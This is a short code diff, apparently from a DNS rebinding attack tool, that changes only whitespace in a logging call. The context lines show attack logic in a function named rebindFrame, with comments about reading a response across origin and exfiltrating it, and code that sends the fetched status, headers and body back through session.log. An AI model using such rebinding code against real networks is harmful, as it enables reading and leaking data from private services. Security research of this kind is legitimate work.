@@ -28,7 +28,7 @@ function rebindFrame () {
     // We can now read the response across origin...
     network.get(session.baseURL, (code, headers, body) => {
       // ... and exfiltrate it
-      session.log({code: code, headers: headers, body: body})
+      session.log({ code: code, headers: headers, body: body })
     })
   })
 }
